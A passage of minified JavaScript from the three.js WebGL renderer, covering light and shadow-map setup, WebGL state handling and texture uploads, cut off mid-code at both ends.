e=[],i=0,n=[],r=[],a={id:-1};return{opaque:n,transparent:r,init:function(){i=0,n.length=0,r.length=0},push:function(e,i,a,o,s,l){e=t(e,i,a,o,s,l),(!0===a.transparent?r:n).push(e)},unshift:function(e,i,a,o,s,l){e=t(e,i,a,o,s,l),(!0===a.transparent?r:n).unshift(e)},sort:function(){1<n.length&&n.sort(ge),1<r.length&&r.sort(ve)}}}function xe(){function t(i){(i=i.target).removeEventListener("dispose",t),e.delete(i)}var e=new WeakMap;return{get:function(i,n){var r=e.get(i);if(void 0===r){var a=new ye;e.set(i,new WeakMap),e.get(i).set(n,a),i.addEventListener("dispose",t)}else void 0===(a=r.get(n))&&(a=new ye,r.set(n,a));return a},dispose:function(){e=new WeakMap}}}function be(){var t={};return{get:function(e){if(void 0!==t[e.id])return t[e.id];switch(e.type){case"DirectionalLight":var n={direction:new r,color:new b,shadow:!1,shadowBias:0,shadowRadius:1,shadowMapSize:new i};break;case"SpotLight":n={position:new r,direction:new r,color:new b,distance:0,coneCos:0,penumbraCos:0,decay:0,shadow:!1,shadowBias:0,shadowRadius:1,shadowMapSize:new i};break;case"PointLight":n={position:new r,color:new b,distance:0,decay:0,shadow:!1,shadowBias:0,shadowRadius:1,shadowMapSize:new i,shadowCameraNear:1,shadowCameraFar:1e3};break;case"HemisphereLight":n={direction:new r,skyColor:new b,groundColor:new b};break;case"RectAreaLight":n={color:new b,position:new r,halfWidth:new r,halfHeight:new r}}return t[e.id]=n}}}function we(t,e){return(e.castShadow?1:0)-(t.castShadow?1:0)}function _e(){for(var t=new be,e={version:0,hash:{directionalLength:-1,pointLength:-1,spotLength:-1,rectAreaLength:-1,hemiLength:-1,numDirectionalShadows:-1,numPointShadows:-1,numSpotShadows:-1},ambient:[0,0,0],probe:[],directional:[],directionalShadowMap:[],directionalShadowMatrix:[],spot:[],spotShadowMap:[],spotShadowMatrix:[],rectArea:[],point:[],pointShadowMap:[],pointShadowMatrix:[],hemi:[],numDirectionalShadows:-1,numPointShadows:-1,numSpotShadows:-1},i=0;9>i;i++)e.probe.push(new r);var n=new r,a=new h,o=new h;return{setup:function(i,r,s){for(var l=0,c=0,h=0,u=0;9>u;u++)e.probe[u].set(0,0,0);var d=r=0,p=0,f=0,m=0,g=0,v=0,y=0;s=s.matrixWorldInverse,i.sort(we),u=0;for(var x=i.length;u<x;u++){var b=i[u],w=b.color,_=b.intensity,M=b.distance,S=b.shadow&&b.shadow.map?b.shadow.map.texture:null;if(b.isAmbientLight)l+=w.r*_,c+=w.g*_,h+=w.b*_;else if(b.isLightProbe)for(S=0;9>S;S++)e.probe[S].addScaledVector(b.sh.coefficients[S],_);else if(b.isDirectionalLight){var T=t.get(b);T.color.copy(b.color).multiplyScalar(b.intensity),T.direction.setFromMatrixPosition(b.matrixWorld),n.setFromMatrixPosition(b.target.matrixWorld),T.direction.sub(n),T.direction.transformDirection(s),(T.shadow=b.castShadow)&&(_=b.shadow,T.shadowBias=_.bias,T.shadowRadius=_.radius,T.shadowMapSize=_.mapSize,e.directionalShadowMap[r]=S,e.directionalShadowMatrix[r]=b.shadow.matrix,g++),e.directional[r]=T,r++}else b.isSpotLight?((T=t.get(b)).position.setFromMatrixPosition(b.matrixWorld),T.position.applyMatrix4(s),T.color.copy(w).multiplyScalar(_),T.distance=M,T.direction.setFromMatrixPosition(b.matrixWorld),n.setFromMatrixPosition(b.target.matrixWorld),T.direction.sub(n),T.direction.transformDirection(s),T.coneCos=Math.cos(b.angle),T.penumbraCos=Math.cos(b.angle*(1-b.penumbra)),T.decay=b.decay,(T.shadow=b.castShadow)&&(_=b.shadow,T.shadowBias=_.bias,T.shadowRadius=_.radius,T.shadowMapSize=_.mapSize,e.spotShadowMap[p]=S,e.spotShadowMatrix[p]=b.shadow.matrix,y++),e.spot[p]=T,p++):b.isRectAreaLight?((T=t.get(b)).color.copy(w).multiplyScalar(_),T.position.setFromMatrixPosition(b.matrixWorld),T.position.applyMatrix4(s),o.identity(),a.copy(b.matrixWorld),a.premultiply(s),o.extractRotation(a),T.halfWidth.set(.5*b.width,0,0),T.halfHeight.set(0,.5*b.height,0),T.halfWidth.applyMatrix4(o),T.halfHeight.applyMatrix4(o),e.rectArea[f]=T,f++):b.isPointLight?((T=t.get(b)).position.setFromMatrixPosition(b.matrixWorld),T.position.applyMatrix4(s),T.color.copy(b.color).multiplyScalar(b.intensity),T.distance=b.distance,T.decay=b.decay,(T.shadow=b.castShadow)&&(_=b.shadow,T.shadowBias=_.bias,T.shadowRadius=_.radius,T.shadowMapSize=_.mapSize,T.shadowCameraNear=_.camera.near,T.shadowCameraFar=_.camera.far,e.pointShadowMap[d]=S,e.pointShadowMatrix[d]=b.shadow.matrix,v++),e.point[d]=T,d++):b.isHemisphereLight&&((T=t.get(b)).direction.setFromMatrixPosition(b.matrixWorld),T.direction.transformDirection(s),T.direction.normalize(),T.skyColor.copy(b.color).multiplyScalar(_),T.groundColor.copy(b.groundColor).multiplyScalar(_),e.hemi[m]=T,m++)}e.ambient[0]=l,e.ambient[1]=c,e.ambient[2]=h,(i=e.hash).directionalLength===r&&i.pointLength===d&&i.spotLength===p&&i.rectAreaLength===f&&i.hemiLength===m&&i.numDirectionalShadows===g&&i.numPointShadows===v&&i.numSpotShadows===y||(e.directional.length=r,e.spot.length=p,e.rectArea.length=f,e.point.length=d,e.hemi.length=m,e.directionalShadowMap.length=g,e.pointShadowMap.length=v,e.spotShadowMap.length=y,e.directionalShadowMatrix.length=g,e.pointShadowMatrix.length=v,e.spotShadowMatrix.length=y,i.directionalLength=r,i.pointLength=d,i.spotLength=p,i.rectAreaLength=f,i.hemiLength=m,i.numDirectionalShadows=g,i.numPointShadows=v,i.numSpotShadows=y,e.version=Rs++)},state:e}}function Me(){var t=new _e,e=[],i=[];return{init:function(){e.length=0,i.length=0},state:{lightsArray:e,shadowsArray:i,lights:t},setupLights:function(n){t.setup(e,i,n)},pushLight:function(t){e.push(t)},pushShadow:function(t){i.push(t)}}}function Se(){function t(i){(i=i.target).removeEventListener("dispose",t),e.delete(i)}var e=new WeakMap;return{get:function(i,n){if(!1===e.has(i)){var r=new Me;e.set(i,new WeakMap),e.get(i).set(n,r),i.addEventListener("dispose",t)}else!1===e.get(i).has(n)?(r=new Me,e.get(i).set(n,r)):r=e.get(i).get(n);return r},dispose:function(){e=new WeakMap}}}function Te(t){T.call(this),this.type="MeshDepthMaterial",this.depthPacking=3200,this.morphTargets=this.skinning=!1,this.displacementMap=this.alphaMap=this.map=null,this.displacementScale=1,this.displacementBias=0,this.wireframe=!1,this.wireframeLinewidth=1,this.lights=this.fog=!1,this.setValues(t)}function Ee(t){T.call(this),this.type="MeshDistanceMaterial",this.referencePosition=new r,this.nearDistance=1,this.farDistance=1e3,this.morphTargets=this.skinning=!1,this.displacementMap=this.alphaMap=this.map=null,this.displacementScale=1,this.displacementBias=0,this.lights=this.fog=!1,this.setValues(t)}function Ce(t,e,n){function r(e,i,n,r,a,o){var s=e.geometry,l=d,c=e.customDepthMaterial;return n.isPointLight&&(l=p,c=e.customDistanceMaterial),c?l=c:(c=!1,i.morphTargets&&(s&&s.isBufferGeometry?c=s.morphAttributes&&s.morphAttributes.position&&0<s.morphAttributes.position.length:s&&s.isGeometry&&(c=s.morphTargets&&0<s.morphTargets.length)),e.isSkinnedMesh&&!1===i.skinning&&console.warn("THREE.WebGLShadowMap: THREE.SkinnedMesh with material.skinning set to false:",e),s=0,c&&(s|=1),(e=e.isSkinnedMesh&&i.skinning)&&(s|=2),l=l[s]),t.localClippingEnabled&&!0===i.clipShadows&&0!==i.clippingPlanes.length&&(s=l.uuid,c=i.uuid,void 0===(e=f[s])&&(e={},f[s]=e),void 0===(s=e[c])&&(s=l.clone(),e[c]=s),l=s),l.visible=i.visible,l.wireframe=i.wireframe,l.side=3===o?null!=i.shadowSide?i.shadowSide:i.side:null!=i.shadowSide?i.shadowSide:m[i.side],l.clipShadows=i.clipShadows,l.clippingPlanes=i.clippingPlanes,l.clipIntersection=i.clipIntersection,l.wireframeLinewidth=i.wireframeLinewidth,l.linewidth=i.linewidth,n.isPointLight&&l.isMeshDistanceMaterial&&(l.referencePosition.setFromMatrixPosition(n.matrixWorld),l.nearDistance=r,l.farDistance=a),l}function a(i,n,s,l,c){if(!1!==i.visible){if(i.layers.test(n.layers)&&(i.isMesh||i.isLine||i.isPoints)&&(i.castShadow||i.receiveShadow&&3===c)&&(!i.frustumCulled||o.intersectsObject(i))){i.modelViewMatrix.multiplyMatrices(s.matrixWorldInverse,i.matrixWorld);var h=e.update(i),u=i.material;if(Array.isArray(u))for(var d=h.groups,p=0,f=d.length;p<f;p++){var m=d[p],g=u[m.materialIndex];g&&g.visible&&(g=r(i,g,l,s.near,s.far,c),t.renderBufferDirect(s,null,h,g,i,m))}else u.visible&&(g=r(i,u,l,s.near,s.far,c),t.renderBufferDirect(s,null,h,g,i,null))}for(h=0,u=(i=i.children).length;h<u;h++)a(i[h],n,s,l,c)}}var o=new et,c=new i,h=new i,u=new s,d=Array(4),p=Array(4),f={},m={0:1,1:0,2:2},g=new Y({defines:{SAMPLE_RATE:.25,HALF_SAMPLE_RATE:.125},uniforms:{shadow_pass:{value:null},resolution:{value:new i},radius:{value:4}},vertexShader:"void main() {\n\tgl_Position = vec4( position, 1.0 );\n}",fragmentShader:"uniform sampler2D shadow_pass;\nuniform vec2 resolution;\nuniform float radius;\n#include <packing>\nvoid main() {\n  float mean = 0.0;\n  float squared_mean = 0.0;\n  \n\tfloat depth = unpackRGBAToDepth( texture2D( shadow_pass, ( gl_FragCoord.xy  ) / resolution ) );\n  for ( float i = -1.0; i < 1.0 ; i += SAMPLE_RATE) {\n    #ifdef HORIZONAL_PASS\n      vec2 distribution = decodeHalfRGBA ( texture2D( shadow_pass, ( gl_FragCoord.xy + vec2( i, 0.0 ) * radius ) / resolution ) );\n      mean += distribution.x;\n      squared_mean += distribution.y * distribution.y + distribution.x * distribution.x;\n    #else\n      float depth = unpackRGBAToDepth( texture2D( shadow_pass, ( gl_FragCoord.xy + vec2( 0.0,  i )  * radius ) / resolution ) );\n      mean += depth;\n      squared_mean += depth * depth;\n    #endif\n  }\n  mean = mean * HALF_SAMPLE_RATE;\n  squared_mean = squared_mean * HALF_SAMPLE_RATE;\n  float std_dev = pow( squared_mean - mean * mean, 0.5 );\n  gl_FragColor = encodeHalfRGBA( vec2( mean, std_dev ) );\n}"}),v=g.clone();v.defines.HORIZONAL_PASS=1;var y=new F;y.addAttribute("position",new C(new Float32Array([-1,-1,.5,3,-1,.5,-1,3,.5]),3));var x=new H(y,g);for(y=0;4!==y;++y){var b=0!=(1&y),w=0!=(2&y),_=new Te({depthPacking:3201,morphTargets:b,skinning:w});d[y]=_,b=new Ee({morphTargets:b,skinning:w}),p[y]=b}var M=this;this.enabled=!1,this.autoUpdate=!0,this.needsUpdate=!1,this.type=1,this.render=function(i,r,s){if(!1!==M.enabled&&(!1!==M.autoUpdate||!1!==M.needsUpdate)&&0!==i.length){var d=t.getRenderTarget(),p=t.getActiveCubeFace(),f=t.getActiveMipmapLevel(),m=t.state;m.setBlending(0),m.buffers.color.setClear(1,1,1,1),m.buffers.depth.setTest(!0),m.setScissorTest(!1);for(var y=0,b=i.length;y<b;y++){var w=i[y],_=w.shadow;if(void 0===_)console.warn("THREE.WebGLShadowMap:",w,"has no shadow.");else{c.copy(_.mapSize);var S=_.getFrameExtents();c.multiply(S),h.copy(_.mapSize),(c.x>n||c.y>n)&&(console.warn("THREE.WebGLShadowMap:",w,"has shadow exceeding max texture size, reducing"),c.x>n&&(h.x=Math.floor(n/S.x),c.x=h.x*S.x,_.mapSize.x=h.x),c.y>n&&(h.y=Math.floor(n/S.y),c.y=h.y*S.y,_.mapSize.y=h.y)),null!==_.map||_.isPointLightShadow||3!==this.type||(S={minFilter:1006,magFilter:1006,format:1023},_.map=new l(c.x,c.y,S),_.map.texture.name=w.name+".shadowMap",_.mapPass=new l(c.x,c.y,S),_.camera.updateProjectionMatrix()),null===_.map&&(S={minFilter:1003,magFilter:1003,format:1023},_.map=new l(c.x,c.y,S),_.map.texture.name=w.name+".shadowMap",_.camera.updateProjectionMatrix()),t.setRenderTarget(_.map),t.clear(),S=_.getViewportCount();for(var T=0;T<S;T++){var E=_.getViewport(T);u.set(h.x*E.x,h.y*E.y,h.x*E.z,h.y*E.w),m.viewport(u),_.updateMatrices(w,s,T),o=_.getFrustum(),a(r,s,_.camera,w,this.type)}_.isPointLightShadow||3!==this.type||(w=_,_=s,S=e.update(x),g.uniforms.shadow_pass.value=w.map.texture,g.uniforms.resolution.value=w.mapSize,g.uniforms.radius.value=w.radius,t.setRenderTarget(w.mapPass),t.clear(),t.renderBufferDirect(_,null,S,g,x,null),v.uniforms.shadow_pass.value=w.mapPass.texture,v.uniforms.resolution.value=w.mapSize,v.uniforms.radius.value=w.radius,t.setRenderTarget(w.map),t.clear(),t.renderBufferDirect(_,null,S,v,x,null))}}M.needsUpdate=!1,t.setRenderTarget(d,p,f)}}}function Ae(t,e,i,n){function r(e,i,n){var r=new Uint8Array(4),a=t.createTexture();for(t.bindTexture(e,a),t.texParameteri(e,10241,9728),t.texParameteri(e,10240,9728),e=0;e<n;e++)t.texImage2D(i+e,0,6408,1,1,0,6408,5121,r);return a}function a(i,r){y[i]=1,0===x[i]&&(t.enableVertexAttribArray(i),x[i]=1),b[i]!==r&&((n.isWebGL2?t:e.get("ANGLE_instanced_arrays"))[n.isWebGL2?"vertexAttribDivisor":"vertexAttribDivisorANGLE"](i,r),b[i]=r)}function o(e){!0!==w[e]&&(t.enable(e),w[e]=!0)}function l(e){!1!==w[e]&&(t.disable(e),w[e]=!1)}function c(e,n,r,a,s,c,h,u){if(0===e)S&&(l(3042),S=!1);else if(S||(o(3042),S=!0),5!==e){if(e!==T||u!==O){if(100===E&&100===L||(t.blendEquation(32774),L=E=100),u)switch(e){case 1:t.blendFuncSeparate(1,771,1,771);break;case 2:t.blendFunc(1,1);break;case 3:t.blendFuncSeparate(0,0,769,771);break;case 4:t.blendFuncSeparate(0,768,0,770);break;default:console.error("THREE.WebGLState: Invalid blending: ",e)}else switch(e){case 1:t.blendFuncSeparate(770,771,1,771);break;case 2:t.blendFunc(770,1);break;case 3:t.blendFunc(0,769);break;case 4:t.blendFunc(0,768);break;default:console.error("THREE.WebGLState: Invalid blending: ",e)}R=P=A=C=null,T=e,O=u}}else s=s||n,c=c||r,h=h||a,n===E&&s===L||(t.blendEquationSeparate(i.convert(n),i.convert(s)),E=n,L=s),r===C&&a===A&&c===P&&h===R||(t.blendFuncSeparate(i.convert(r),i.convert(a),i.convert(c),i.convert(h)),C=r,A=a,P=c,R=h),T=e,O=null}function h(e){I!==e&&(e?t.frontFace(2304):t.frontFace(2305),I=e)}function u(e){0!==e?(o(2884),e!==z&&(1===e?t.cullFace(1029):2===e?t.cullFace(1028):t.cullFace(1032))):l(2884),z=e}function d(e,i,n){e?(o(32823),(N!==i||k!==n)&&(t.polygonOffset(i,n),N=i,k=n)):l(32823)}function p(e){void 0===e&&(e=33984+B-1),H!==e&&(t.activeTexture(e),H=e)}var f=new function(){var e=!1,i=new s,n=null,r=new s(0,0,0,0);return{setMask:function(i){n===i||e||(t.colorMask(i,i,i,i),n=i)},setLocked:function(t){e=t},setClear:function(e,n,a,o,s){!0===s&&(e*=o,n*=o,a*=o),i.set(e,n,a,o),!1===r.equals(i)&&(t.clearColor(e,n,a,o),r.copy(i))},reset:function(){e=!1,n=null,r.set(-1,0,0,0)}}},m=new function(){var e=!1,i=null,n=null,r=null;return{setTest:function(t){t?o(2929):l(2929)},setMask:function(n){i===n||e||(t.depthMask(n),i=n)},setFunc:function(e){if(n!==e){if(e)switch(e){case 0:t.depthFunc(512);break;case 1:t.depthFunc(519);break;case 2:t.depthFunc(513);break;case 3:t.depthFunc(515);break;case 4:t.depthFunc(514);break;case 5:t.depthFunc(518);break;case 6:t.depthFunc(516);break;case 7:t.depthFunc(517);break;default:t.depthFunc(515)}else t.depthFunc(515);n=e}},setLocked:function(t){e=t},setClear:function(e){r!==e&&(t.clearDepth(e),r=e)},reset:function(){e=!1,r=n=i=null}}},g=new function(){var e=!1,i=null,n=null,r=null,a=null,s=null,c=null,h=null,u=null;return{setTest:function(t){e||(t?o(2960):l(2960))},setMask:function(n){i===n||e||(t.stencilMask(n),i=n)},setFunc:function(e,i,o){n===e&&r===i&&a===o||(t.stencilFunc(e,i,o),n=e,r=i,a=o)},setOp:function(e,i,n){s===e&&c===i&&h===n||(t.stencilOp(e,i,n),s=e,c=i,h=n)},setLocked:function(t){e=t},setClear:function(e){u!==e&&(t.clearStencil(e),u=e)},reset:function(){e=!1,u=h=c=s=a=r=n=i=null}}},v=t.getParameter(34921),y=new Uint8Array(v),x=new Uint8Array(v),b=new Uint8Array(v),w={},_=null,M=null,S=null,T=null,E=null,C=null,A=null,L=null,P=null,R=null,O=!1,I=null,z=null,D=null,N=null,k=null,B=t.getParameter(35661),F=!1;v=0,-1!==(v=t.getParameter(7938)).indexOf("WebGL")?(v=parseFloat(/^WebGL ([0-9])/.exec(v)[1]),F=1<=v):-1!==v.indexOf("OpenGL ES")&&(v=parseFloat(/^OpenGL ES ([0-9])/.exec(v)[1]),F=2<=v);var H=null,G={},j=new s,U=new s,V={};return V[3553]=r(3553,3553,1),V[34067]=r(34067,34069,6),f.setClear(0,0,0,1),m.setClear(1),g.setClear(0),o(2929),m.setFunc(3),h(!1),u(1),o(2884),c(0),{buffers:{color:f,depth:m,stencil:g},initAttributes:function(){for(var t=0,e=y.length;t<e;t++)y[t]=0},enableAttribute:function(t){a(t,0)},enableAttributeAndDivisor:a,disableUnusedAttributes:function(){for(var e=0,i=x.length;e!==i;++e)x[e]!==y[e]&&(t.disableVertexAttribArray(e),x[e]=0)},enable:o,disable:l,getCompressedTextureFormats:function(){if(null===_&&(_=[],e.get("WEBGL_compressed_texture_pvrtc")||e.get("WEBGL_compressed_texture_s3tc")||e.get("WEBGL_compressed_texture_etc1")||e.get("WEBGL_compressed_texture_astc")))for(var i=t.getParameter(34467),n=0;n<i.length;n++)_.push(i[n]);return _},useProgram:function(e){return M!==e&&(t.useProgram(e),M=e,!0)},setBlending:c,setMaterial:function(t,e){2===t.side?l(2884):o(2884);var i=1===t.side;e&&(i=!i),h(i),1===t.blending&&!1===t.transparent?c(0):c(t.blending,t.blendEquation,t.blendSrc,t.blendDst,t.blendEquationAlpha,t.blendSrcAlpha,t.blendDstAlpha,t.premultipliedAlpha),m.setFunc(t.depthFunc),m.setTest(t.depthTest),m.setMask(t.depthWrite),f.setMask(t.colorWrite),e=t.stencilWrite,g.setTest(e),e&&(g.setFunc(t.stencilFunc,t.stencilRef,t.stencilMask),g.setOp(t.stencilFail,t.stencilZFail,t.stencilZPass)),d(t.polygonOffset,t.polygonOffsetFactor,t.polygonOffsetUnits)},setFlipSided:h,setCullFace:u,setLineWidth:function(e){e!==D&&(F&&t.lineWidth(e),D=e)},setPolygonOffset:d,setScissorTest:function(t){t?o(3089):l(3089)},activeTexture:p,bindTexture:function(e,i){null===H&&p();var n=G[H];void 0===n&&(n={type:void 0,texture:void 0},G[H]=n),n.type===e&&n.texture===i||(t.bindTexture(e,i||V[e]),n.type=e,n.texture=i)},compressedTexImage2D:function(){try{t.compressedTexImage2D.apply(t,arguments)}catch(t){console.error("THREE.WebGLState:",t)}},texImage2D:function(){try{t.texImage2D.apply(t,arguments)}catch(t){console.error("THREE.WebGLState:",t)}},texImage3D:function(){try{t.texImage3D.apply(t,arguments)}catch(t){console.error("THREE.WebGLState:",t)}},scissor:function(e){!1===j.equals(e)&&(t.scissor(e.x,e.y,e.z,e.w),j.copy(e))},viewport:function(e){!1===U.equals(e)&&(t.viewport(e.x,e.y,e.z,e.w),U.copy(e))},reset:function(){for(var e=0;e<x.length;e++)1===x[e]&&(t.disableVertexAttribArray(e),x[e]=0);w={},H=_=null,G={},z=I=T=M=null,f.reset(),m.reset(),g.reset()}}}function Le(t,e,i,n,r,a,o){function s(t,e){return C?new OffscreenCanvas(t,e):document.createElementNS("http://www.w3.org/1999/xhtml","canvas")}function l(t,e,i,n){var r=1;if((t.width>n||t.height>n)&&(r=n/Math.max(t.width,t.height)),1>r||!0===e){if("undefined"!=typeof HTMLImageElement&&t instanceof HTMLImageElement||"undefined"!=typeof HTMLCanvasElement&&t instanceof HTMLCanvasElement||"undefined"!=typeof ImageBitmap&&t instanceof ImageBitmap)return e=(n=e?Ca.floorPowerOfTwo:Math.floor)(r*t.width),r=n(r*t.height),void 0===T&&(T=s(e,r)),(i=i?s(e,r):T).width=e,i.height=r,i.getContext("2d").drawImage(t,0,0,e,r),console.warn("THREE.WebGLRenderer: Texture has been resized from ("+t.width+"x"+t.height+") to ("+e+"x"+r+")."),i;"data"in t&&console.warn("THREE.WebGLRenderer: Image in DataTexture is too big ("+t.width+"x"+t.height+").")}return t}function c(t){return Ca.isPowerOfTwo(t.width)&&Ca.isPowerOfTwo(t.height)}function h(t,e){return t.generateMipmaps&&e&&1003!==t.minFilter&&1006!==t.minFilter}function u(e,i,r,a){t.generateMipmap(e),n.get(i).__maxMipLevel=Math.log(Math.max(r,a))*Math.LOG2E}function d(t,i){if(!r.isWebGL2)return t;var n=t;return 6403===t&&(5126===i&&(n=33326),5131===i&&(n=33325),5121===i&&(n=33321)),6407===t&&(5126===i&&(n=34837),5131===i&&(n=34843),5121===i&&(n=32849)),6408===t&&(5126===i&&(n=34836),5131===i&&(n=34842),5121===i&&(n=32856)),33325===n||33326===n||34842===n||34836===n?e.get("EXT_color_buffer_float"):(34843===n||34837===n)&&console.warn("THREE.WebGLRenderer: Floating point textures with RGB format not supported. Please use RGBA instead."),n}function p(t){return 1003===t||1004===t||1005===t?9728:9729}function f(e){(e=e.target).removeEventListener("dispose",f);var i=n.get(e);void 0!==i.__webglInit&&(t.deleteTexture(i.__webglTexture),n.remove(e)),e.isVideoTexture&&E.delete(e),o.memory.textures--}function m(e){(e=e.target).removeEventListener("dispose",m);var i=n.get(e),r=n.get(e.texture);if(e){if(void 0!==r.__webglTexture&&t.deleteTexture(r.__webglTexture),e.depthTexture&&e.depthTexture.dispose(),e.isWebGLRenderTargetCube)for(r=0;6>r;r++)t.deleteFramebuffer(i.__webglFramebuffer[r]),i.__webglDepthbuffer&&t.deleteRenderbuffer(i.__webglDepthbuffer[r]);else t.deleteFramebuffer(i.__webglFramebuffer),i.__webglDepthbuffer&&t.deleteRenderbuffer(i.__webglDepthbuffer);n.remove(e.texture),n.remove(e)}o.memory.textures--}function g(t,e){var r=n.get(t);if(t.isVideoTexture){var a=o.render.frame;E.get(t)!==a&&(E.set(t,a),t.update())}if(0<t.version&&r.__version!==t.version)if(void 0===(a=t.image))console.warn("THREE.WebGLRenderer: Texture marked for update but image is undefined");else{if(!1!==a.complete)return void w(r,t,e);console.warn("THREE.WebGLRenderer: Texture marked for update but image is incomplete")}i.activeTexture(33984+e),i.bindTexture(3553,r.__webglTexture)}function v(e,o){if(6===e.image.length){var s=n.get(e);if(0<e.version&&s.__version!==e.version){b(s,e),i.activeTexture(33984+o),i.bindTexture(34067,s.__webglTexture),t.pixelStorei(37440,e.flipY);var p=e&&e.isCompressedTexture;o=e.image[0]&&e.image[0].isDataTexture;for(var f=[],m=0;6>m;m++)f[m]=p||o?o?e.image[m].image:e.image[m]:l(e.image[m],!1,!0,r.maxCubemapSize);var g=f[0],v=c(g)||r.isWebGL2,y=a.convert(e.format),w=a.convert(e.type),_=d(y,w);if(x(34067,e,v),p){for(m=0;6>m;m++){var M=f[m].mipmaps;for(p=0;p<M.length;p++){var S=M[p];1023!==e.format&&1022!==e.format?-1<i.getCompressedTextureFormats().indexOf(y)?i.compressedTexImage2D(34069+m,p,_,S.width,S.height,0,S.data):console.warn("THREE.WebGLRenderer: Attempt to load unsupported compressed texture format in .setTextureCube()"):i.texImage2D(34069+m,p,_,S.width,S.height,0,y,w,S.data)}}s.__maxMipLevel=M.length-1}else{for(M=e.mipmaps,m=0;6>m;m++)if(o)for(i.texImage2D(34069+m,0,_,f[m].width,f[m].height,0,y,w,f[m].data),p=0;p<M.length;p++)S=(S=M[p]).image[m].image,i.texImage2D(34069+m,p+1,_,S.width,S.height,0,y,w,S.data);else for(i.texImage2D(34069+m,0,_,y,w,f[m]),p=0;p<M.length;p++)S=M[p],i.texImage2D(34069+m,p+1,_,y,w,S.image[m]);s.__maxMipLevel=M.length}h(e,v)&&u(34067,e,g.width,g.height),s.__version=e.version,e.onUpdate&&e.onUpdate(e)}else i.activeTexture(33984+o),i.bindTexture(34067,s.__webglTexture)}}function y(t,e){i.activeTexture(33984+e),i.bindTexture(34067,n.get(t).__webglTexture)}function x(i,o,s){s?(t.texParameteri(i,10242,a.convert(o.wrapS)),t.texParameteri(i,10243,a.convert(o.wrapT)),32879!==i&&35866!==i||t.texParameteri(i,32882,a.convert(o.wrapR)),t.texParameteri(i,10240,a.convert(o.magFilter)),t.texParameteri(i,10241,a.convert(o.minFilter))):(t.texParameteri(i,10242,33071),t.texParameteri(i,10243,33071),32879!==i&&35866!==i||t.texParameteri(i,32882,33071),1001===o.wrapS&&1001===o.wrapT||console.warn("THREE.WebGLRenderer: Texture is not power of two. Texture.wrapS and Texture.wrapT should be set to THREE.ClampToEdgeWrapping."),t.texParameteri(i,10240,p(o.magFilter)),t.texParameteri(i,10241,p(o.minFilter)),1003!==o.minFilter&&1006!==o.minFilter&&console.warn("THREE.WebGLRenderer: Texture is not power of two. Texture.minFilter should be set to THREE.NearestFilter or THREE.LinearFilter.")),!(s=e.get("EXT_texture_filter_anisotropic"))||1015===o.type&&null===e.get("OES_texture_float_linear")||1016===o.type&&null===(r.isWebGL2||e.get("OES_texture_half_float_linear"))||!(1<o.anisotropy||n.get(o).__currentAnisotropy)||(t.texParameterf(i,s.TEXTURE_MAX_ANISOTROPY_EXT,Math.min(o.anisotropy,r.getMaxAnisotropy())),n.get(o).__currentAnisotropy=o.anisotropy)}function b(e,i){void 0===e.__webglInit&&(e.__webglInit=!0,i.addEventListener("dispose",f),e.__webglTexture=t.createTexture(),o.memory.textures++)}function w(e,n,o){var s=3553;n.isDataTexture2DArray&&(s=35866),n.isDataTexture3D&&(s=32879),b(e,n),i.activeTexture(33984+o),i.bindTexture(s,e.__webglTexture),t.pixelStorei(37440,n.flipY),t.pixelStorei(37441,n.premultiplyAlpha),t.pixelStorei(3317,n.unpackAlignment),o=(o=!r.isWebGL2&&(1001!==n.wrapS||1001!==n.wrapT||1003!==n.minFilter&&1006!==n.minFilter))&&!1===c(n.image);var p=c(o=l(n.image,o,!1,r.maxTextureSize))||r.isWebGL2,f=a.convert(n.format),m=a.convert(n.type),g=d(f,m);x(s,n,p);var v=n.mipmaps;if(n.isDepthTexture){if(g=6402,1015===n.type){if(!r.isWebGL2)throw Error("Float Depth Texture only supported in WebGL2.0");g=36012}else r.isWebGL2&&(g=33189);1026===n.format&&6402===g&&1012!==n.type&&1014!==n.type&&(console.warn("THREE.WebGLRenderer: Use UnsignedShortType or UnsignedIntType for DepthFormat DepthTexture."),n.type=1012,m=a.convert(n.type)),1027===n.format&&(g=34041,1020!==n.type&&(console.warn("THREE.WebGLRenderer: Use UnsignedInt248Type for DepthStencilFormat DepthTexture."),n.type=1020,m=a.convert(n.type))),i.texImage2D(3553,0,g,o.width,o.height,0,f,m,null)}else if(n.isDataTexture)if(0<v.length&&p){for(var y=0,w=v.length;y<w;y++)s=v[y],i.texImage2D(3553,y,g,s.width,s.height,0,f,m,s.data);n.generateMipmaps=!1,e.__maxMipLevel=v.length-1}else i.texImage2D(3553,0,g,o.width,o.height,0,f,m,o.data),e.__maxMipLevel=0;else if(n.isCompressedTexture){for(y=0,w=v.length;y<w;y++)s=v[y],1023!==n.format&&1022!==n.format?-1<i.getCompressedTextureFormats().indexOf(f)?i.compressedTexImage2D(3553,y,g,s.width,s.height,0,s.data):console.warn("THREE.WebGLRenderer: Attempt to load unsupported compressed texture format in .uploadTexture()"):i.texImage2D(3553,y,g,s.width,s.height,0,f,m,s.data);e.__maxMipLevel=v.length-1}else if(n.isDataTexture2DArray)i.texImage3D(35866,0,g,o.width,o.height,o.depth,0,f,m,o.data),e.__maxMipLevel=0;else if(n.isDataTexture3D)i.texImage3D(32879,0,g,o.width,o.height,o.depth,0,f,m,o.data),e.__maxMipLevel=0;else if(0<v.length&&p){for(y=0,w=v.length;y<w;y++)s=v[y],i.texImage2D(3553,y,g,f,m,s);n.generateMipmaps=!1,e.__maxMipLevel=v.length-1}else i.texImage2D(3553,0,g,f,m,o),e.__maxMipLevel=0;h(n,p)&&u(3553,n,o.width,o.height),e.__version=n.version,n.onUpdate&&n.onUpdate(n)}function _(e,r,o,s){var l=a.convert(r.texture.format),c=a.convert(r.texture.type),h=d(l,c);i.texImage2D(s,0,h,r.width,r.height,0,l,c,null),t.bindFramebuffer(36160,e),t.framebufferTexture2D(36160,o,s,n.get(r.texture).__webglTexture,0),t.bindFramebuffer(36160,null)}function M(e,i,n){if(t.bindRenderbuffer(36161,e),i.depthBuffer&&!i.stencilBuffer)n?(n=S(i),t.renderbufferStorageMultisample(36161,n,33189,i.width,i.height)):t.renderbufferStorage(36161,33189,i.width,i.height),t.framebufferRenderbuffer(36160,36096,36161,e);else 